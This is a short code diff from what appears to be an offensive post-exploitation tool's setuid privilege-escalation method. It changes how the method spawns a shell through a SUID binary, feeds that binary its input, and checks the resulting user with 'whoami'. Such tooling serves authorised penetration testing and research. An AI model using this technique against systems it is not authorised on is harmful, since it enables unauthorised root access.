@@ -130,7 +130,7 @@ class SetuidMethod(Method):
         """ Run the specified technique """
 
         binary = technique.ident
-        enter, exit = binary.shell("/bin/bash")
+        enter, input, exit = binary.shell(self.pty.shell, suid=True)
 
         info(
             f"attempting potential privesc with {Fore.GREEN}{Style.BRIGHT}{binary.path}{Style.RESET_ALL}",
@@ -140,8 +140,13 @@ class SetuidMethod(Method):
         before_shell_level = int(before_shell_level) if before_shell_level != b"" else 0
 
         # Run the start commands
-        self.pty.run(enter + "\n")
-        self.pty.recvuntil("\n")
+        self.pty.run(enter + "\n", wait=False)
+
+        # Send required input
+        self.pty.client.send(input.encode("utf-8"))
+
+        # Wait for result
+        self.pty.run("echo")
 
         # sleep(0.1)
         user = self.pty.run("whoami").strip().decode("utf-8")
